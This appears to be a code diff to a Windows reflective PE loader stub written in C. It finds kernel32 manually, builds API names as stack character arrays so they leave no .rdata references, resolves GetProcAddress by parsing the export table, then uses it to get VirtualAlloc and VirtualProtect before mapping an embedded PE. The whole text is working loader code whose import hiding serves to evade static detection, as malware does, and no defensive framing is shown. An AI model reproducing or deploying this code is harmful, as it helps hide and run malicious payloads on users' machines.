@@ -305,18 +305,27 @@ void _start(void) {
     HMODULE hK32 = find_kernel32();
     if (!hK32) return;
 
-    /* All function name strings on the stack — no .rdata references */
-    char sLoadLibraryA[]   = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
+    /*
+     * Resolve GetProcAddress via manual export table parsing.
+     * GetProcAddress is NEVER forwarded in kernel32 on any Windows version.
+     *
+     * Then use the real GetProcAddress for all other functions — it handles
+     * forwarded exports internally (VirtualAlloc, VirtualProtect, etc. are
+     * forwarded to api-ms-win-core-* / KERNELBASE on Windows 10+).
+     */
     char sGetProcAddress[] = {'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0};
+    fn_GetProcAddress pGetProcAddress = (fn_GetProcAddress)find_export(hK32, sGetProcAddress);
+    if (!pGetProcAddress) return;
+
+    char sLoadLibraryA[]   = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
     char sVirtualAlloc[]   = {'V','i','r','t','u','a','l','A','l','l','o','c',0};
     char sVirtualProtect[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};
 
-    fn_LoadLibraryA   pLoadLibraryA   = (fn_LoadLibraryA)  find_export(hK32, sLoadLibraryA);
-    fn_GetProcAddress pGetProcAddress = (fn_GetProcAddress)find_export(hK32, sGetProcAddress);
-    fn_VirtualAlloc   pVirtualAlloc   = (fn_VirtualAlloc)  find_export(hK32, sVirtualAlloc);
-    fn_VirtualProtect pVirtualProtect = (fn_VirtualProtect)find_export(hK32, sVirtualProtect);
+    fn_LoadLibraryA   pLoadLibraryA   = (fn_LoadLibraryA)  pGetProcAddress(hK32, sLoadLibraryA);
+    fn_VirtualAlloc   pVirtualAlloc   = (fn_VirtualAlloc)  pGetProcAddress(hK32, sVirtualAlloc);
+    fn_VirtualProtect pVirtualProtect = (fn_VirtualProtect)pGetProcAddress(hK32, sVirtualProtect);
 
-    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc || !pVirtualProtect)
+    if (!pLoadLibraryA || !pVirtualAlloc || !pVirtualProtect)
         return;
 
     /* ── Map the embedded PE ── */
@@ -347,7 +356,7 @@ void _start(void) {
      */
     char sSleep[] = {'S','l','e','e','p',0};
     typedef VOID (WINAPI *fn_Sleep)(DWORD);
-    fn_Sleep pSleep = (fn_Sleep)find_export(hK32, sSleep);
+    fn_Sleep pSleep = (fn_Sleep)pGetProcAddress(hK32, sSleep);
     if (pSleep) {
         for (;;) pSleep(60000);
     }
